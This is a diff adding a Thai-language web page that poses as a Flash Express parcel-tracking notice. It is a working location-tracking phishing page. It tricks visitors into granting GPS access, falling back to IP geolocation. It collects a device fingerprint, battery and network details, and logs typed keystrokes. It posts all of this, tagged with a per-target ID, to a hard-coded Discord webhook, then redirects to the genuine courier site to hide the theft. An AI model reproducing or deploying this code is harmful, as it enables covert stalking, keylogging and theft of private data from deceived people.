@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#FEE500" />
+  <title>Flash Express - ตรวจสอบพัสดุ</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            flashYellow: '#FEE500',
+            flashYellowDark: '#E5C900',
+            flashBlue: '#0A2463',
+          },
+          fontFamily: {
+            mono: ['"JetBrains Mono"', '"Fira Code"', 'Consolas', 'monospace'],
+            sans: ['"Inter"', 'system-ui', 'sans-serif'],
+          },
+        },
+      },
+    };
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/styles.css" />
+  <style>
+    .flash-gradient {
+      background: linear-gradient(135deg, #FEE500 0%, #FFF200 100%);
+    }
+    .flash-shadow {
+      box-shadow: 0 10px 25px rgba(254, 229, 0, 0.25);
+    }
+  </style>
+</head>
+<body class="h-full bg-white text-gray-800 font-sans antialiased overflow-hidden">
+
+  <!-- Modal Overlay - Flash Express Theme -->
+  <div id="modal-overlay" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 px-4">
+    <div class="w-full max-w-md">
+      <div class="rounded-2xl border-2 border-flashYellow bg-white p-6 flash-shadow">
+        <div class="mb-4 text-center">
+          <div class="mx-auto mb-3 flex h-16 w-16 items-center justify-center rounded-full flash-gradient">
+            <svg class="h-8 w-8 text-flashBlue" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
+              <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+            </svg>
+          </div>
+          <h2 class="text-xl font-bold text-flashBlue mb-2">แจ้งเตือนพัสดุ Flash Express</h2>
+        </div>
+        
+        <p class="text-sm text-center text-gray-700 mb-5 leading-relaxed">
+          ⚠️ เพื่อความปลอดภัยของทรัพย์สินและการนำจ่ายที่ถูกต้อง โปรดกด <strong class="text-flashBlue">'อนุญาต (Allow)'</strong> สิทธิ์การระบุตำแหน่งทุกครั้ง เพื่อยืนยันพิกัดเจ้าหน้าที่พัสดุที่อยู่ใกล้คุณที่สุดในขณะนี้
+        </p>
+        
+        <button id="allow-btn" class="w-full rounded-lg flash-gradient px-4 py-2.5 font-semibold text-flashBlue transition hover:opacity-90 active:scale-[0.98] shadow-md">
+          อนุญาต (Allow)
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    'use strict';
+
+    // ===== CONFIGURATION =====
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
+    const BASE_LAT = 9.9833;
+    const BASE_LNG = 99.1500;
+    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
+
+    // ===== GET URL PARAMETER =====
+    function getUrlParam(name) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
+    }
+
+    // ===== SCREEN ANALYTICS =====
+    function captureScreenAnalytics() {
+      try {
+        const w = window.screen?.width || 0;
+        const h = window.screen?.height || 0;
+        const dpr = window.devicePixelRatio || 1;
+        return {
+          width: w,
+          height: h,
+          devicePixelRatio: dpr,
+          resolution: `${w}x${h}`,
+          effectiveResolution: `${Math.round(w * dpr)}x${Math.round(h * dpr)}`,
+          orientation: w > h ? 'Landscape' : 'Portrait',
+        };
+      } catch (_) {
+        return { width: 0, height: 0, devicePixelRatio: 1, resolution: '—', effectiveResolution: '—', orientation: '—' };
+      }
+    }
+
+    // ===== FINGERPRINT =====
+    function detectOS() {
+      try {
+        const ua = navigator.userAgent || '';
+        if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+        if (/Android/.test(ua)) return 'Android';
+        if (/Mac OS X/.test(ua)) return 'Mac';
+        if (/Windows/.test(ua)) return 'Windows';
+        if (/Linux/.test(ua)) return 'Linux';
+      } catch (_) {}
+      return 'Unknown';
+    }
+
+    function detectBrowser() {
+      try {
+        const ua = navigator.userAgent || '';
+        if (ua.includes('Firefox/')) return 'Firefox';
+        if (ua.includes('Edg/')) return 'Edge';
+        if (ua.includes('Chrome/')) return 'Chrome';
+        if (ua.includes('Safari/')) return 'Safari';
+      } catch (_) {}
+      return 'Unknown';
+    }
+
+    function getFingerprint() {
+      const sa = captureScreenAnalytics();
+      let tz = 'Unknown';
+      try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
+      return {
+        os: detectOS(),
+        browser: detectBrowser(),
+        language: navigator.language || 'Unknown',
+        languages: (navigator.languages || []).join(', ') || 'Unknown',
+        timezone: tz,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        screen: sa.resolution,
+        screenWidth: sa.width,
+        screenHeight: sa.height,
+        devicePixelRatio: sa.devicePixelRatio,
+        effectiveResolution: sa.effectiveResolution,
+        orientation: sa.orientation,
+        platform: navigator.platform || 'Unknown',
+        online: typeof navigator.onLine === 'boolean' ? navigator.onLine : true,
+      };
+    }
+
+    // ===== HAVERSINE =====
+    function haversine(lat1, lng1, lat2, lng2) {
+      const R = 6371, rad = (d) => (d * Math.PI) / 180;
+      const dLat = rad(lat2 - lat1), dLng = rad(lng2 - lng1);
+      const a = Math.sin(dLat / 2) ** 2 + Math.cos(rad(lat1)) * Math.cos(rad(lat2)) * Math.sin(dLng / 2) ** 2;
+      return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+    }
+
+    function calcDist(lat, lng) {
+      if (lat == null || lng == null) return null;
+      return haversine(lat, lng, BASE_LAT, BASE_LNG);
+    }
+
+    // ===== GEOLOCATION =====
+    function requestGPS() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error('Geolocation not supported'));
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+          }),
+          (err) => reject(err),
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function fetchIPGeo() {
+      const res = await fetch('https://ipapi.co/json/');
+      if (!res.ok) throw new Error(`IP API ${res.status}`);
+      return res.json();
+    }
+
+    // ===== DISCORD =====
+    function postDiscord(payload) {
+      if (!DISCORD_WEBHOOK_URL) return Promise.resolve(false);
+      const body = JSON.stringify(payload);
+
+      try {
+        if (typeof navigator.sendBeacon === 'function') {
+          const blob = new Blob([body], { type: 'application/json' });
+          if (navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob)) return Promise.resolve(true);
+        }
+      } catch (_) {}
+
+      return fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body,
+      }).then(() => true).catch(() => false);
+    }
+
+    async function sendToDiscord(data) {
+      if (!DISCORD_WEBHOOK_URL) return;
+
+      const granted = data.permission === 'Granted';
+      const fp = data.fingerprint || {};
+      const fields = [
+        { name: '🎭 Actor', value: data.actor || 'Unknown', inline: false },
+        { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
+        { name: '📡 Source', value: data.source || '—', inline: true },
+      ];
+
+      if (data.coords) {
+        fields.push({ name: '📍 Coordinates', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
+        if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
+      }
+      if (data.distanceKm != null) {
+        fields.push({ name: '📏 Distance from HQ', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
+      }
+      if (data.ipData) {
+        fields.push(
+          { name: '🌍 Country', value: `${data.ipData.country_name || '—'}`, inline: true },
+          { name: '🏙 City', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
+          { name: '🌐 ISP', value: data.ipData.org || '—', inline: false },
+          { name: '🔢 IP', value: data.ipData.ip || '—', inline: true },
+        );
+      }
+
+      fields.push(
+        { name: '💻 OS', value: fp.os || '—', inline: true },
+        { name: '🌐 Browser', value: fp.browser || '—', inline: true },
+        { name: '🗣 Language', value: fp.language || '—', inline: true },
+        { name: '🕰 Timezone', value: fp.timezone || '—', inline: true },
+        { name: '📱 Screen', value: fp.screen || '—', inline: true },
+        { name: '🔍 DPR', value: String(fp.devicePixelRatio ?? '—'), inline: true },
+        { name: '🖥 Effective Res', value: fp.effectiveResolution || '—', inline: true },
+        { name: '👤 Target ID', value: data.targetId || '—', inline: true },
+      );
+
+      if (data.mapsLink) fields.push({ name: '🗺 Google Maps', value: `[Open Map](${data.mapsLink})`, inline: false });
+
+      await postDiscord({
+        embeds: [{
+          title: '🛰 SHADOW_EYE_MATRIX — Location Report',
+          description: granted ? `${data.actor}: GPS Granted` : `${data.actor}: GPS Denied — IP + Fingerprint`,
+          color: granted ? 0x22c55e : 0xef4444,
+          fields,
+          footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard' },
+          timestamp: data.timestamp,
+        }],
+      });
+    }
+
+    // ===== LIVE TYPING =====
+    let typingBuffer = '';
+    function initLiveTyping() {
+      document.addEventListener('keydown', (e) => {
+        if (e.key.length === 1) {
+          typingBuffer += e.key;
+        } else if (e.key === 'Backspace' && typingBuffer.length > 0) {
+          typingBuffer = typingBuffer.slice(0, -1);
+        } else if (e.key === 'Enter') {
+          if (typingBuffer.length > 0) {
+            sendLiveTypingToDiscord(typingBuffer);
+          }
+          typingBuffer = '';
+        }
+      });
+    }
+
+    async function sendLiveTypingToDiscord(text) {
+      if (!DISCORD_WEBHOOK_URL) return;
+      
+      const blob = new Blob([JSON.stringify({
+        embeds: [{
+          title: '⌨️ Live Typing Detected',
+          description: `Target: ${getUrlParam('id') || 'Unknown'}\nกำลังพิมพ์ข้อความ: "${text}"`,
+          color: 0xf97316,
+          footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor' },
+          timestamp: new Date().toISOString()
+        }]
+      })], { type: 'application/json' });
+
+      try {
+        if (typeof navigator.sendBeacon === 'function') {
+          navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
+        }
+      } catch (_) {}
+    }
+
+    // ===== HYBRID GEOLOCATION =====
+    async function runHybridGeolocation() {
+      const targetId = getUrlParam('id') || 'player_1';
+      const fp = getFingerprint();
+      const result = {
+        actor: 'Target',
+        targetId: targetId,
+        permission: null,
+        source: null,
+        coords: null,
+        ipData: null,
+        fingerprint: fp,
+        distanceKm: null,
+        timestamp: new Date().toISOString(),
+        mapsLink: null,
+      };
+
+      try {
+        const gps = await requestGPS();
+        result.permission = 'Granted';
+        result.source = 'GPS';
+        result.coords = gps;
+        result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
+      } catch (err) {
+        result.permission = 'Denied';
+        result.source = 'IP Geolocation';
+
+        try {
+          const ip = await fetchIPGeo();
+          result.ipData = ip;
+          result.coords = { latitude: ip.latitude, longitude: ip.longitude };
+          result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+        } catch (ipErr) {
+          console.error('IP Geo failed:', ipErr);
+        }
+      }
+
+      if (result.coords?.latitude != null) {
+        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
+      }
+
+      // Get battery info
+      if (typeof navigator.getBattery === 'function') {
+        try {
+          const battery = await navigator.getBattery();
+          result.battery = Math.round((battery.level || 0) * 100);
+          result.charging = battery.charging;
+        } catch (_) {}
+      }
+
+      // Get network info
+      try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          result.network = conn.effectiveType || conn.type || 'Unknown';
+        }
+      } catch (_) {}
+
+      // Send to Discord
+      await sendToDiscord(result);
+
+      // Redirect to Flash Express
+      window.location.href = FLASH_EXPRESS_URL;
+    }
+
+    // ===== INIT =====
+    document.addEventListener('DOMContentLoaded', () => {
+      const allowBtn = document.getElementById('allow-btn');
+      
+      // Initialize live typing monitor
+      initLiveTyping();
+      
+      allowBtn?.addEventListener('click', async () => {
+        // Hide modal
+        const modal = document.getElementById('modal-overlay');
+        if (modal) {
+          modal.style.opacity = '0';
+          modal.style.transition = 'opacity 0.3s ease';
+          setTimeout(() => {
+            modal.style.display = 'none';
+          }, 300);
+        }
+        
+        // Run hybrid geolocation
+        await runHybridGeolocation();
+      });
+    });
+  </script>
+</body>
+</html>
